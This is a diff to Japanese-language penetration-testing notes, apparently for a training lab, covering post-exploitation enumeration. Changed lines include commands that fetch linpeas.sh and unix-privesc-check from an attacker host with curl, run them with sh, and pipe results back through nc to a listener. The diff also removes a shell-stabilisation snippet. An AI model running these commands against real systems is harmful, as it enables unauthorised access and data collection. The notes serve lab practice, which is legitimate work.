@@ -1,19 +1,7 @@
 - `/var/mail/root`を確認すると、Cron daemonからの自動メールログが確認できる
 - Cronでは、コマンド引数である`X-Cron-Env`を閲覧
 - openポートにメール用のポート（SMTPなど）がopenであることを確認
-- posgresが動いているみたいなのでアクセスしてみる
 
----
-
-# シェルの安定化
-
-※penelopeでシェル獲得できた場合は不要
-```zsh
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm-256color
-# Ctrl + Z
-stty raw -echo; fg
-```
 
 ---
 
@@ -31,7 +19,7 @@ nc -lvnp 9002 | tee unix-privesc-check.out
 ```
 ```zsh
 # Target
-curl <AttackerIP>:8888/unix-privesc-check | sh -s standard | nc -q 0 <AttackerIP> 9002
+curl 192.168.45.201:8888/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.201 9002
 ```
 
 ### 実行結果抽出
@@ -51,7 +39,7 @@ nc -lvnp 9002 | tee linpeas.out
 ```
 ```zsh
 # Target
-curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
+curl 192.168.45.201:8888/linpeas.sh | sh | nc -q 0 192.168.45.201 9002
 ```
 
 ### 実行結果抽出
@@ -113,6 +101,12 @@ curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
 
 ## システムデーモン
 
+- 気になるデーモン
+```sh
+/usr/sbin/sendmail -FCronDaemon elldllla: -FCronDaemon -1 -odi -oem -oi -t -f root
+
+/usr/bin/mongod -f /etc/mongod.conf
+```
 
 
 ---
